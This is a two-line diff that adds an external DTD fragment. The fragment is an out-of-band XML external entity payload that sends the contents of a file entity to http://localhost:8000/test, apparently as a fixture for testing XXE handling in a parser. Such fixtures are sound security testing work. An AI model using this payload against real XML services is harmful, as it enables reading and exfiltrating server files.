@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8000/test?file=%file;'>">
+%all;
